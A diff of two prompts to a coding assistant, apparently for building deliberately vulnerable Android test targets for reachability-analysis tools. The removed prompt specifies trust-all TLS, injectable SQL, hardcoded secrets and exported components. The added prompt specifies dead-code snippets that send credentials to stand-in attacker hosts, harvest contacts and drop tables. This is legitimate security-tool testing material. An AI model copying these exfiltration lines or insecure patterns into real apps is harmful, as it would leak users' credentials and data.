@@ -1,122 +1,180 @@
-Create a simple Android application called "ReachabilityTestApp" designed as a
-intentionally vulnerable target app for reachability analysis testing
-(network reachability, code/call graph reachability, and Android component
-reachability). This is for authorized security research and testing purposes only.
+I have an existing Android app at the current project directory called 
+ReachabilityTestApp (package: com.test.reachability). I want you to modify 
+the existing Java source files to inject intentionally unreachable/dead 
+vulnerable code patterns. 
 
-## Project Setup
-- Language: Java (not Kotlin) for broader static analysis tool compatibility
-- Min SDK: 21, Target SDK: 33
-- Single module app, no unnecessary dependencies
-- Package name: com.test.reachability
+The goal is to test reachability analysis tools — these vulnerabilities must 
+NEVER be executable at runtime. A correctly functioning analysis tool should 
+NOT flag any of these as reachable issues.
 
-## App Structure
-Create a simple multi-screen app with a MainActivity that has buttons navigating
-to each demo screen. Include the following:
+Do NOT create new Activity screens or modify AndroidManifest.xml.
+Do NOT break any existing functionality.
+Only add dead code into existing files.
 
 ---
 
-### 1. MainActivity.java
-- Simple launcher with 4 buttons: "Network Demo", "Storage Demo",
-  "Component Demo", "SQL Demo"
-- Hardcode an API key constant at the top of the file:
-    private static final String API_KEY = "sk-prod-ABC123hardcodedSecret999";
-- Hardcode a secondary credential:
-    private static final String DB_PASSWORD = "admin1234!";
-- These should be referenced in at least one method so they appear in the call graph
+## PATTERN 1 — Dead Methods (defined but never called)
+### File: MainActivity.java
+
+Add these private methods to MainActivity but do NOT call them anywhere:
+
+1. A method `leakCredentialsToUrl()`:
+   - Builds a URL string by concatenating API_KEY and DB_PASSWORD into an 
+     HTTP GET request: 
+     "http://evil.logger.io/harvest?key=" + API_KEY + "&pass=" + DB_PASSWORD
+   - Opens an HttpURLConnection to that URL and calls connect()
+   - This method must have NO callers anywhere in the codebase
+
+2. A method `nukeDatabase()`:
+   - Gets a writable SQLiteDatabase and executes "DROP TABLE IF EXISTS users" 
+     then "DROP TABLE IF EXISTS sessions"
+   - Closes the DB
+   - This method must have NO callers anywhere in the codebase
+
+3. A method `writeCredsToExternalStorage()`:
+   - Writes API_KEY + "\n" + DB_PASSWORD to 
+     Environment.getExternalStorageDirectory() + "/leaked_creds.txt"
+   - This method must have NO callers anywhere in the codebase
+
+Mark each with a comment: // DEAD CODE - reachability test: should NOT be flagged
 
 ---
 
-### 2. NetworkActivity.java
-- Two buttons: "Fetch HTTP" and "Fetch HTTPS (no pinning)"
-- HTTP button: Make a plain HTTP request to http://example.com using
-  HttpURLConnection on a background thread. Show response code in a TextView.
-- HTTPS button: Make an HTTPS request using a custom TrustManager that accepts
-  ALL certificates (do not validate hostname or cert chain). Target
-  https://example.com. Show response code in a TextView.
-- Add a helper method sendToAnalytics(String url) that makes an HTTP call to a
-  hardcoded analytics endpoint: http://analytics.internal.corp/track
-  This method should be defined but called from a non-obvious code path
-  (e.g., inside an exception handler) to create an interesting reachability case.
+## PATTERN 2 — Unreachable Branches (impossible conditions)
+### File: NetworkActivity.java
+
+Inside the existing HTTP fetch button click handler, after the existing code, 
+add a block:
+
+    if (false) {
+        // DEAD BRANCH - reachability test: should NOT be flagged
+        // Simulates insecure credential exfiltration
+        String payload = "key=" + MainActivity.API_KEY;
+        URL u = new URL("http://attacker.internal/steal?" + payload);
+        HttpURLConnection c = (HttpURLConnection) u.openConnection();
+        c.setRequestMethod("POST");
+        c.connect();
+    }
+
+### File: StorageActivity.java
+
+Add a method `conditionallyDeleteSecrets()` that contains:
+
+    private void conditionallyDeleteSecrets() {
+        boolean shouldDelete = false; // never changes
+        if (shouldDelete) {
+            // DEAD BRANCH - reachability test: should NOT be flagged
+            File f = new File(Environment.getExternalStorageDirectory(), 
+                              "secrets.txt");
+            f.delete();
+            SharedPreferences prefs = getSharedPreferences("app_prefs", 0);
+            prefs.edit().clear().apply();
+            Log.d("SECRETS", "All secrets wiped: " + 
+                  "super_secret_token_9982xABC");
+        }
+    }
+
+Call `conditionallyDeleteSecrets()` from the Write button handler 
+(so the METHOD is reachable — but the vulnerable branch inside it is not).
+This is a more subtle dead code case for analysis tools.
+
+### File: SqlActivity.java
+
+Inside the Login button click handler, after the existing SQL query code, add:
+
+    int debugMode = 0; // hardcoded, never reassigned
+    if (debugMode == 1) {
+        // DEAD BRANCH - reachability test: should NOT be flagged
+        // Raw query with full schema dump
+        String dumpQuery = "SELECT * FROM sqlite_master WHERE type='table'";
+        Cursor c = db.rawQuery(dumpQuery, null);
+        String result = "";
+        while (c.moveToNext()) {
+            result += c.getString(0) + "\n";
+        }
+        Log.d("SQLDUMP", result);
+    }
 
 ---
 
-### 3. StorageActivity.java
-- Two buttons: "Write Secret" and "Read Secret"
-- Write button: Save a hardcoded secret string
-  ("super_secret_token_9982xABC") to SharedPreferences in MODE_WORLD_READABLE
-  (use the integer value 1 directly if the constant is deprecated).
-- Also write the same secret to a file in external storage
-  (Environment.getExternalStorageDirectory()) as "secrets.txt"
-- Read button: Read and display the file content in a TextView
-- Include a method logSensitiveData() that logs the secret using Log.d()
-  with tag "SECRETS" — call this from the Write button handler
+## PATTERN 3 — Orphaned Classes (never instantiated)
+### Create these new Java files but do NOT reference them anywhere:
+
+1. `DeadAdminClient.java` (package com.test.reachability):
+   - A standalone class (no Activity/Service extension)
+   - Has a constructor that accepts Context
+   - Method `authenticate()`: makes an HTTP POST to 
+     "http://internal.admin.corp/api/login" with hardcoded body:
+     "user=superadmin&pass=letmein999"
+   - Method `exfiltrateContacts()`: queries ContentResolver for 
+     ContactsContract.Contacts.CONTENT_URI and logs all display names 
+     with Log.d("EXFIL", name)
+   - Mark class with comment: 
+     // ORPHANED CLASS - reachability test: should NOT be flagged
+   - This class must have zero references anywhere in the project
+
+2. `LegacyDataUploader.java` (package com.test.reachability):
+   - A standalone class with a method `uploadAll(Context ctx)`:
+     - Reads from SharedPreferences key "app_prefs"
+     - Reads from external storage file "secrets.txt"  
+     - Sends both values via HTTP POST to 
+       "http://legacy.tracker.io/upload"
+   - Mark class with comment:
+     // ORPHANED CLASS - reachability test: should NOT be flagged
+   - This class must have zero references anywhere in the project
 
 ---
 
-### 4. SqlActivity.java
-- EditText for username input and a "Login" button
-- Perform a raw SQL query with direct string concatenation (no parameterized
-  queries):
-    "SELECT * FROM users WHERE username = '" + userInput + "'"
-- Use SQLiteOpenHelper to create a local DB called "users.db" with a "users"
-  table (id, username, password columns)
-- Pre-populate with one row: ('admin', 'password123')
-- Display the raw query string in a TextView before executing it
-- Include a second method executeAdminQuery() that runs
-  "DROP TABLE IF EXISTS users" — define it but only call it from a
-  long-press listener on the Login button (non-obvious reachability path)
+## PATTERN 4 — Code After Return/Throw
+### File: SqlActivity.java
+
+In the existing `executeAdminQuery()` method, BEFORE the DROP TABLE statement, 
+add an early return, then put a vulnerable SQL execution after it:
+
+    private void executeAdminQuery() {
+        if (true) {
+            return; // always exits here
+        }
+        // DEAD CODE AFTER RETURN - reachability test: should NOT be flagged
+        SQLiteDatabase db = dbHelper.getWritableDatabase();
+        db.execSQL("DROP TABLE IF EXISTS users");
+        db.execSQL("GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'");
+        db.close();
+    }
+
+### File: NetworkActivity.java
+
+In the `sendToAnalytics()` method (existing), before its HTTP call, 
+add a throw that always fires:
+
+    private void sendToAnalytics(String url) {
+        throw new UnsupportedOperationException("Analytics disabled");
+        // DEAD CODE AFTER THROW - reachability test: should NOT be flagged
+        HttpURLConnection conn = (HttpURLConnection) 
+            new URL("http://analytics.internal.corp/track?data=" 
+                    + url + "&key=" + MainActivity.API_KEY).openConnection();
+        conn.connect();
+    }
 
 ---
 
-### 5. ExposedActivity.java
-- A simple screen showing "Hidden Admin Panel" with a TextView displaying
-  the hardcoded API_KEY and DB_PASSWORD (imported as constants from MainActivity)
-- In AndroidManifest.xml, declare this Activity with:
-    android:exported="true"
-    <intent-filter>
-        <action android:name="com.test.reachability.ADMIN" />
-        <category android:name="android.intent.category.DEFAULT" />
-    </intent-filter>
-- This makes it launchable by any app without permission
+## Final README.md Update
 
----
+Append a new section "## Dead Code Test Cases" to the existing README.md 
+listing every pattern added, the file it lives in, the vulnerability it 
+simulates, and the expected analysis tool result:
 
-### 6. AndroidManifest.xml
-Include these permissions:
-- android.permission.INTERNET
-- android.permission.READ_EXTERNAL_STORAGE
-- android.permission.WRITE_EXTERNAL_STORAGE
-- android.permission.ACCESS_NETWORK_STATE
+| Pattern | File | Simulated Vuln | Expected Tool Result |
+|---|---|---|---|
+| Dead method: leakCredentialsToUrl | MainActivity | Credential exfil via HTTP | NOT reachable |
+| Dead method: nukeDatabase | MainActivity | Destructive DB operation | NOT reachable |
+| Dead method: writeCredsToExternalStorage | MainActivity | Insecure file write | NOT reachable |
+| if(false) branch | NetworkActivity | Credential in URL param | NOT reachable |
+| if(shouldDelete==false) branch | StorageActivity | Secret log + file wipe | NOT reachable |
+| if(debugMode==1) branch | SqlActivity | Schema dump via raw SQL | NOT reachable |
+| Orphaned class: DeadAdminClient | DeadAdminClient | HTTP auth + contact exfil | NOT reachable |
+| Orphaned class: LegacyDataUploader | LegacyDataUploader | Secrets upload via HTTP | NOT reachable |
+| Code after return | SqlActivity | Destructive SQL | NOT reachable |
+| Code after throw | NetworkActivity | Cred exfil in analytics | NOT reachable |
 
-Also add an exported Service called PhantomService that does nothing
-(empty onStartCommand) but is declared exported="true" with no permissions —
-another reachable component for analysis.
-
----
-
-### 7. network_security_config.xml
-Create a network security config that explicitly allows cleartext traffic for
-ALL domains:
-    <base-config cleartextTrafficPermitted="true" />
-Reference it in the manifest: android:networkSecurityConfig="@xml/network_security_config"
-
----
-
-### 8. README.md
-Include a README listing:
-- All intentional vulnerabilities and their locations
-- The reachability test cases each vulnerability enables
-- Example ADB commands to trigger ExposedActivity externally:
-    adb shell am start -n com.test.reachability/.ExposedActivity
-    adb shell am start -a com.test.reachability.ADMIN
-- A warning that this app is for testing only and must not be published
-
----
-
-## Build Configuration (build.gradle)
-- Disable minification (minifyEnabled false)
-- Disable resource shrinking
-- Use debuggable true in all build types
-- No ProGuard — keep all class/method names intact for call graph analysis
-
-Generate all files with correct directory structure ready to open in Android Studio and help me to build the apk if possible
+Rebuild the app after completion
